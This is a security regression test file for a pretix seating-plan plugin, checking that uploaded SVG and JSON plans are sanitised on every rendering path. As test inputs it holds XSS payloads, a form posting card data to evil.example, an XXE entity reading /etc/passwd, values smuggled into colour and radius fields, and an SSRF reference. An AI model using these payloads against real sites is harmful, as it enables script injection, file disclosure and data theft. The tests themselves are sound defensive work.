"""
Security regression tests for everything that handles the plan SVG at the
view level: the two import paths (SVG / seats-editor JSON), and every place
the stored plan is rendered (admin preview, audit page, shopper config.js,
plan.svg, ticket image).

The organizer who uploads a plan is not the audience it is rendered to:
customers see it in their checkout, other team members in the control panel.
"""
import json
import re

from django.utils.html import escape
from lxml import etree
from pretix.base.models import Order  # noqa: F401  (ensures pretix models are loaded)

from pretix_simpleseatingplan.models import Seat, SeatingConfig
from pretix_simpleseatingplan.ticket_image import render_seat_plan_png

from .base import SVG, SeatingTestCase

HOSTILE_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100" onload="alert(\'svg-onload\')">'
    '<script>alert("script-tag")</script>'
    '<g id="seat-a1" data-seat-label="A-1" onclick="alert(\'g-onclick\')">'
    '<circle cx="20" cy="20" r="10" fill="#22c55e" onmouseover="alert(\'circle-over\')"/></g>'
    '<a href="javascript:alert(\'anchor\')"><g id="seat-a2" data-seat-label="A-2"><circle cx="50" cy="20" r="10"/></g></a>'
    '<foreignObject width="200" height="100"><form action="https://evil.example/steal"><input name="card"></form></foreignObject>'
    '<text>&lt;script&gt;alert(&quot;entity-encoded&quot;)&lt;/script&gt;</text>'
    '</svg>'
)
# What must never survive in any rendered output.
FORBIDDEN = ('<script', 'onload', 'onclick', 'onmouseover', 'javascript:', 'foreignObject', '<form', 'evil.example')


class BadMarkup:
    """Mixin: assertion helper shared by the tests below."""

    def assertClean(self, text, msg=''):
        lowered = text.lower()
        for needle in FORBIDDEN:
            self.assertNotIn(needle.lower(), lowered, '%s: %r survived' % (msg, needle))


class UploadTests(BadMarkup, SeatingTestCase):
    def test_benign_svg_upload_still_imports_seats_and_stores_the_plan(self):
        client = self.admin_client()
        resp = self.upload_plan(client, svg=SVG)
        self.assertEqual(resp.status_code, 302, getattr(resp, 'content', b'')[:500])
        cfg = SeatingConfig.objects.get(event=self.event)
        self.assertIn('id="seat-a1"', cfg.svg)
        self.assertIn('data-seat-label="A-1"', cfg.svg)
        self.assertEqual(sorted(Seat.objects.filter(event=self.event).values_list('seat_guid', flat=True)), ['a1', 'a2', 'a3'])

    def test_hostile_svg_upload_is_stored_sanitized_but_seats_still_import(self):
        client = self.admin_client()
        resp = self.upload_plan(client, svg=HOSTILE_SVG)
        self.assertEqual(resp.status_code, 302)
        cfg = SeatingConfig.objects.get(event=self.event)
        self.assertClean(cfg.svg, 'stored svg')
        self.assertEqual(sorted(Seat.objects.filter(event=self.event).values_list('seat_guid', flat=True)), ['a1', 'a2'])

    def test_entity_encoded_markup_is_not_turned_into_real_markup(self):
        client = self.admin_client()
        self.upload_plan(client, svg=HOSTILE_SVG)
        root = etree.fromstring(SeatingConfig.objects.get(event=self.event).svg.encode())
        self.assertEqual(root.xpath('//*[local-name()="script"]'), [])

    def _layout(self, color='#ef4444', radius=12):
        return {
            'size': {'width': 300, 'height': 200},
            'categories': [{'name': 'Cat', 'color': color}],
            'zones': [{'position': {'x': 0, 'y': 0}, 'rows': [{
                'row_label': 'A', 'position': {'x': 0, 'y': 0},
                'seats': [{'seat_guid': 'g1', 'uuid': 'u1', 'seat_number': '1', 'category': 'Cat',
                           'position': {'x': 5, 'y': 5}, 'radius': radius}],
            }]}],
        }

    def test_json_import_cannot_inject_attributes_through_category_color(self):
        client = self.admin_client()
        resp = self.upload_plan(client, json_text=json.dumps(self._layout(color='#fff" onload="alert(1)')))
        self.assertEqual(resp.status_code, 302, getattr(resp, 'content', b'')[:300])
        cfg = SeatingConfig.objects.get(event=self.event)
        self.assertClean(cfg.svg, 'json-generated svg')
        self.assertIn('fill="#22c55e"', cfg.svg)  # unusable colour falls back to the default
        self.assertEqual(list(Seat.objects.filter(event=self.event).values_list('seat_guid', 'label')), [('g1', 'A-1')])

    def test_json_import_rejects_a_non_numeric_radius(self):
        client = self.admin_client()
        resp = self.upload_plan(client, json_text=json.dumps(self._layout(radius='12" onclick="alert(2)')))
        self.assertEqual(resp.status_code, 200)  # form error, nothing imported
        self.assertEqual(SeatingConfig.objects.get(event=self.event).svg, SVG)
        self.assertEqual(Seat.objects.filter(event=self.event).count(), 3)

    def test_json_import_still_works_for_a_normal_export(self):
        layout = {
            'size': {'width': 300, 'height': 200},
            'categories': [{'name': 'Cat I', 'color': '#ef4444'}],
            'zones': [{'position': {'x': 0, 'y': 0}, 'rows': [{
                'row_label': 'B', 'position': {'x': 10, 'y': 10},
                'seats': [
                    {'seat_guid': 'g1', 'uuid': 'u1', 'seat_number': '1', 'category': 'Cat I', 'position': {'x': 5, 'y': 5}, 'radius': 12},
                    {'seat_guid': 'g2', 'uuid': 'u2', 'seat_number': '2', 'category': 'Cat I', 'position': {'x': 35, 'y': 5}},
                ],
            }]}],
        }
        client = self.admin_client()
        self.assertEqual(self.upload_plan(client, json_text=json.dumps(layout)).status_code, 302)
        cfg = SeatingConfig.objects.get(event=self.event)
        self.assertIn('fill="#ef4444"', cfg.svg)
        self.assertIn('data-seat-label="B-1"', cfg.svg)
        self.assertEqual(
            sorted(Seat.objects.filter(event=self.event).values_list('seat_guid', 'label', 'category')),
            [('g1', 'B-1', 'Cat I'), ('g2', 'B-2', 'Cat I')],
        )

    def test_invalid_uploads_are_rejected_with_a_form_error_and_change_nothing(self):
        client = self.admin_client()
        bad_uploads = [
            dict(svg='<html><body>not a plan</body></html>'),
            dict(svg='<?xml version="1.0"?><!DOCTYPE s [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'),
            dict(json_text='{not json'),
            dict(json_text='[1, 2, 3]'),
            dict(json_text='{"zones": "nope"}'),
            dict(json_text='{"zones": [{"rows": [{"seats": [{"seat_guid": "g", "position": "x"}]}]}]}'),
            dict(json_text='[' * 50000),  # recursion bomb
        ]
        for kwargs in bad_uploads:
            resp = self.upload_plan(client, **kwargs)
            self.assertEqual(resp.status_code, 200, (kwargs, resp.status_code))  # re-rendered form, not a redirect / 500
            cfg = SeatingConfig.objects.get(event=self.event)
            self.assertEqual(cfg.svg, SVG, 'plan must be unchanged after a failed upload: %r' % (kwargs,))
            self.assertEqual(Seat.objects.filter(event=self.event).count(), 3, 'seats must be unchanged: %r' % (kwargs,))

    def test_failed_import_midway_does_not_leave_the_event_without_seats(self):
        # Two seats sharing a guid used to crash on the unique constraint
        # *after* the old seats had been deleted.
        layout = {'zones': [{'rows': [{'row_label': 'A', 'seats': [
            {'seat_guid': 'dup', 'uuid': 'u1', 'seat_number': '1'},
            {'seat_guid': 'dup', 'uuid': 'u2', 'seat_number': '2'},
        ]}]}]}
        client = self.admin_client()
        resp = self.upload_plan(client, json_text=json.dumps(layout))
        self.assertIn(resp.status_code, (200, 302))
        self.assertGreaterEqual(Seat.objects.filter(event=self.event).count(), 1)

    def test_oversized_upload_is_rejected(self):
        client = self.admin_client()
        resp = self.upload_plan(client, svg='<svg xmlns="http://www.w3.org/2000/svg">' + '<g/>' * 2_000_000 + '</svg>')
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(SeatingConfig.objects.get(event=self.event).svg, SVG)


class RenderingOfLegacyStoredPlansTests(BadMarkup, SeatingTestCase):
    """Plans saved before sanitization existed can still hold hostile markup
    in the database; every output path must clean it on the way out."""

    def setUp(self):
        super().setUp()
        SeatingConfig.objects.filter(event=self.event).update(svg=HOSTILE_SVG)

    def test_admin_settings_preview_is_clean(self):
        resp = self.admin_client().get(self.control_url())
        self.assertEqual(resp.status_code, 200)
        html = resp.content.decode()
        self.assertIn('id="seat-a1"', html)  # the preview still shows the plan
        # the page's own <script> tags are pretix's; look only at the preview well
        well = html[html.index("class='well'"):]
        well = well[:well.index('</div>')]
        self.assertClean(well, 'settings preview')

    def test_audit_page_data_is_clean(self):
        client = self.admin_client()
        resp = client.get(self.control_url('audit/'))
        self.assertEqual(resp.status_code, 200)
        match = re.search(r'<script id="audit-plan-data" type="application/json">(.*?)</script>', resp.content.decode(), re.S)
        self.assertIsNotNone(match, 'audit plan data not rendered')
        data = json.loads(match.group(1))
        self.assertClean(data['svg'], 'audit plan svg')
        self.assertIn('id="seat-a1"', data['svg'])

    def test_shopper_config_js_is_clean(self):
        shopper, _ = self.new_shopper()
        resp = shopper.get(self.url('config.js'))
        self.assertEqual(resp.status_code, 200)
        text = resp.content.decode()
        payload = text[len('window.SimpleSeatingPlanCfg = '):text.index(';(function()')]
        cfg = json.loads(payload)
        self.assertClean(cfg['svg'], 'config.js svg')
        self.assertIn('id="seat-a1"', cfg['svg'])
        self.assertEqual(cfg['prefix'], 'seat-')

    def test_plan_svg_endpoint_is_clean_and_sandboxed(self):
        resp = self.bare_visitor().get(self.url('plan.svg'))
        self.assertEqual(resp.status_code, 200)
        self.assertClean(resp.content.decode(), 'plan.svg body')
        self.assertIn('id="seat-a1"', resp.content.decode())
        self.assertEqual(resp['X-Content-Type-Options'], 'nosniff')
        # A directly opened SVG document must not be able to run inline script:
        # pretix puts its own strict CSP on every response.
        csp = dict(part.strip().split(' ', 1) for part in resp['Content-Security-Policy'].split(';') if ' ' in part.strip())
        self.assertNotIn("'unsafe-inline'", csp.get('script-src', ''))
        self.assertNotIn("'unsafe-inline'", csp.get('default-src', ''))

    def test_unsanitizable_stored_plan_renders_as_empty_not_as_raw_markup(self):
        SeatingConfig.objects.filter(event=self.event).update(svg='<html><script>alert(1)</script></html>')
        shopper, _ = self.new_shopper()
        text = shopper.get(self.url('config.js')).content.decode()
        self.assertNotIn('alert(1)', text)

    def test_ticket_image_still_renders_and_ignores_external_references(self):
        svg = (
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="100" viewBox="0 0 200 100">'
            '<image xlink:href="file:///etc/passwd" width="10" height="10"/>'
            '<image xlink:href="http://127.0.0.1:9/ssrf.png" width="10" height="10"/>'
            '<g id="seat-a1" data-seat-label="A-1"><circle cx="20" cy="20" r="10" fill="#22c55e"/></g></svg>'
        )
        SeatingConfig.objects.filter(event=self.event).update(svg=svg)
        cfg = SeatingConfig.objects.get(event=self.event)
        png = render_seat_plan_png(self.event, cfg, 'a1', 'A-1')
        self.assertIsNotNone(png, 'ticket image must still be produced for a normal plan')
        self.assertTrue(png.startswith(b'\x89PNG'))

    def test_escape_helper_sanity(self):  # guards the tests themselves
        self.assertEqual(escape('<'), '&lt;')
